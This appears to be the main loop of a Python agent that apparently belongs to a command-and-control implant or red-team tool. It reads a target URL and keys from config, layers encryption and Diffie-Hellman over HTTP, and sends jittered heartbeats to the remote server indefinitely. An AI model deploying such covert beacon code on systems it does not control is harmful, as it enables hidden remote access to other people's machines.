import time
import json
import random
from base64 import b64encode, b64decode

from .comm.http import HttpClient
from .comm.sym import EncryptedClient
from .comm.dh import DHClient

from malon_common.crypto.dh import KeyExchange

from . import Agent

with open('config.json', 'r') as f:
    config = json.load(f)

client = HttpClient(config['TargetUrl'])
client = EncryptedClient(b64decode(config['SymKey']), client)
client = DHClient(KeyExchange(b64decode(config['PrivateKey'])), client)

print('Client ID: {}'.format(client.get_client_id().hex()))

agent = Agent(client)



while True:
    try:
        agent.heartbeat()
    except Exception as e:
        print(e)
    time.sleep(3.0 + 2.5*(2.0*random.random() - 1.0))